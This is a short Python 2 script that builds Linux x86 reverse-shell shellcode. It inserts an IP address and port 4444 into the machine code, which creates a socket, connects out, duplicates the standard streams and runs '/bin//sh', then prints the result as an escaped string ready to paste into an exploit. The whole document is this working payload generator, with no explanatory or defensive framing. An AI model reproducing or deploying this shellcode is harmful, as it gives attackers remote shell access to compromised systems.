import struct
import socket

port = struct.pack("!H", 4444)
ip = socket.inet_aton('192.168.1.105')

shellcode = ("\x31\xc0\x89\xc3\x89\xc6\xb0\x66\xb3\x01\x56\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2"
"\xb0\x66\xb3\x03\x68" + 
ip +
"\x66\x68" +
port +
"\x66\x6a\x02\x89\xe1\x6a\x10"
"\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb1\x02\xb0\x37\xcd\x80\x49\x79\xf9\x56"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x89\xf1\x89\xf2\xcd\x80")

print '"' + ''.join('\\x%02x' % ord(c) for c in shellcode) + '";' 